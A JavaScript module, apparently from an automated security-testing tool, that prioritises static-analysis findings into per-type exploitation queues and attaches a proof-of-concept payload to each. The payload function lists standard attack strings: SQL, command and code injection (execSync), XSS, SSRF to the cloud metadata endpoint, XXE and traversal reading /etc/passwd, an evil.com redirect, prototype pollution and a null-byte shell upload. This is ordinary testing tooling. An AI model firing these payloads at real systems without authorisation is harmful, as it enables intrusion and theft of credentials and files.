import { fs, path } from 'zx';
import chalk from 'chalk';

/**
 * Severity weight map for priority scoring
 * @type {Readonly<Record<string, number>>}
 */
const SEVERITY_WEIGHT = Object.freeze({
  CRITICAL: 10,
  HIGH: 7,
  MEDIUM: 4,
  LOW: 2,
  INFO: 0
});

/**
 * Confidence weight map for priority scoring
 * @type {Readonly<Record<string, number>>}
 */
const CONFIDENCE_WEIGHT = Object.freeze({
  HIGH: 3,
  MEDIUM: 2,
  LOW: 1
});

/**
 * Type-based exploitability bonus — higher for types that are typically
 * more likely to be genuinely exploitable when flagged by static analysis.
 * @type {Readonly<Record<string, number>>}
 */
const EXPLOITABILITY_BONUS = Object.freeze({
  injection: 5,
  xss: 4,
  ssrf: 4,
  xxe: 4,
  traversal: 4,
  deserialization: 4,
  upload: 3,
  redirect: 3,
  auth: 3,
  access: 3,
  csrf: 2,
  secrets: 2,
  crypto: 1,
  config: 1,
  dependency: 1,
  other: 0
});

/**
 * Calculate a numeric priority score for a vulnerability.
 * Higher score = test sooner.
 *
 * @param {object} vuln - Normalized vulnerability
 * @returns {number} Priority score (0-18)
 */
function calculatePriority(vuln) {
  const sevScore = SEVERITY_WEIGHT[vuln.severity] || SEVERITY_WEIGHT.MEDIUM;
  const confScore = CONFIDENCE_WEIGHT[vuln.confidence] || CONFIDENCE_WEIGHT.MEDIUM;
  const exploitBonus = EXPLOITABILITY_BONUS[vuln.type] || 0;
  return sevScore + confScore + exploitBonus;
}

/**
 * Generate exploitation queue from normalized vulnerabilities.
 * Groups by type, assigns priority scores, and sorts highest-priority first.
 * Supports all recognized vulnerability categories.
 *
 * @param {Array} vulnerabilities - Normalized vulnerability array
 * @param {string} outputDir - Directory for queue JSON files
 * @returns {Promise<Record<string, Array>>} Created queues keyed by type
 */
export async function generateExploitationQueue(vulnerabilities, outputDir) {
  const queues = {
    injection: [],
    xss: [],
    ssrf: [],
    xxe: [],
    traversal: [],
    redirect: [],
    csrf: [],
    deserialization: [],
    upload: [],
    access: [],
    auth: [],
    secrets: [],
    crypto: [],
    dependency: [],
    config: [],
    other: []
  };
  
  const vulnList = Array.isArray(vulnerabilities) ? vulnerabilities : [];

  // Group vulnerabilities by type
  for (const vuln of vulnList) {
    if (!vuln || typeof vuln !== 'object') continue; // Skip malformed entries
    const rawType = vuln.type || 'other';
    
    // Guard against prototype pollution — only allow known queue types, route unknown to 'other'
    const queueType = Object.prototype.hasOwnProperty.call(queues, rawType) ? rawType : 'other';
    
    const loc = vuln.location || {};
    const priority = calculatePriority(vuln);

    queues[queueType].push({
      id: vuln.id,
      source: vuln.source, // Track which analyzer found it
      sourceVersion: vuln.sourceVersion,
      checkId: vuln.checkId,
      verdict: 'vulnerable',
      severity: vuln.severity || 'MEDIUM',
      confidence: vuln.confidence,
      priority,
      vulnerabilityType: vuln.subType || queueType,
      location: `${loc.file || 'unknown'}:${loc.line || 0}`,
      file: loc.file || 'unknown',
      line: loc.line || 0,
      column: loc.column || 0,
      snippet: loc.snippet || '',
      description: vuln.description,
      remediation: vuln.remediation,
      cwe: vuln.cwe,
      owasp: vuln.owasp,
      cvss: vuln.cvss,
      cve: vuln.cve,
      witnessPayload: generateWitnessPayload(vuln),
      reference: vuln.reference,
      metadata: vuln.metadata,
      suggestedEndpoint: vuln.suggestedEndpoint || null,
      suggestedMethod: vuln.suggestedMethod || null,
      discoveredRoutes: vuln.discoveredRoutes || [],
      derivedEndpoints: vuln.derivedEndpoints || []
    });
  }
  
  // Save queues to files
  const deliverablesDir = path.join(outputDir, 'deliverables');
  await fs.ensureDir(deliverablesDir);
  
  const createdQueues = {};
  
  for (const [type, queue] of Object.entries(queues)) {
    if (queue.length > 0) {
      // Sort by priority descending — highest priority tested first
      queue.sort((a, b) => b.priority - a.priority);

      const queuePath = path.join(deliverablesDir, `${type}_exploitation_queue.json`);
      await fs.writeJSON(queuePath, { vulnerabilities: queue }, { spaces: 2 });
      
      // Show breakdown by source analyzer
      const sourceBreakdown = {};
      for (const vuln of queue) {
        sourceBreakdown[vuln.source] = (sourceBreakdown[vuln.source] || 0) + 1;
      }
      
      console.log(chalk.green(`✅ Created ${type}_exploitation_queue.json with ${queue.length} vulnerabilities`));
      for (const [source, count] of Object.entries(sourceBreakdown)) {
        console.log(chalk.gray(`   - from ${source}: ${count}`));
      }
      
      createdQueues[type] = queue;
    }
  }
  
  return createdQueues;
}

/**
 * Generate witness payload based on vulnerability type and subtype
 */
function generateWitnessPayload(vuln) {
  const subType = vuln.subType || '';
  const type = vuln.type || '';
  
  // Injection payloads — parentheses fix operator precedence
  if (subType === 'SQLi' || (type === 'injection' && vuln.description?.toLowerCase().includes('sql'))) {
    return "' OR '1'='1' --";
  }
  if (subType === 'CommandInjection' || (type === 'injection' && vuln.description?.toLowerCase().includes('command'))) {
    return "; whoami";
  }
  if (subType === 'CodeInjection' || subType === 'EvalInjection') {
    return "require('child_process').execSync('id')";
  }
  if (subType === 'SSTI') {
    return "{{7*7}}";
  }
  if (subType === 'LDAPInjection') {
    return "*)(&";
  }
  if (subType === 'XPathInjection') {
    return "' or '1'='1";
  }
  if (subType === 'NoSQLi') {
    return '{"$gt":""}';
  }
  if (subType === 'HeaderInjection') {
    return "test\r\nX-Injected: true";
  }
  if (subType === 'ELInjection') {
    return "${7*7}";
  }
  
  // XSS payloads
  if (type === 'xss' || subType.includes('XSS')) {
    return "<img src=x onerror=alert(1)>";
  }
  
  // SSRF payloads
  if (type === 'ssrf') {
    return "http://169.254.169.254/latest/meta-data/";
  }

  // XXE payloads
  if (type === 'xxe') {
    return '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
  }

  // Path Traversal payloads
  if (type === 'traversal') {
    return "../../../../etc/passwd";
  }

  // Open Redirect payloads
  if (type === 'redirect') {
    return "//evil.com";
  }

  // CSRF payloads
  if (type === 'csrf') {
    return "csrf_token_bypass_test";
  }

  // Deserialization payloads
  if (type === 'deserialization') {
    return '{"__proto__":{"isAdmin":true}}';
  }

  // File Upload payloads
  if (type === 'upload') {
    return "shell.php%00.jpg";
  }

  // IDOR / Access Control payloads
  if (type === 'access') {
    return "user_id=1";
  }
  
  // Default payload
  return "test_payload";
}
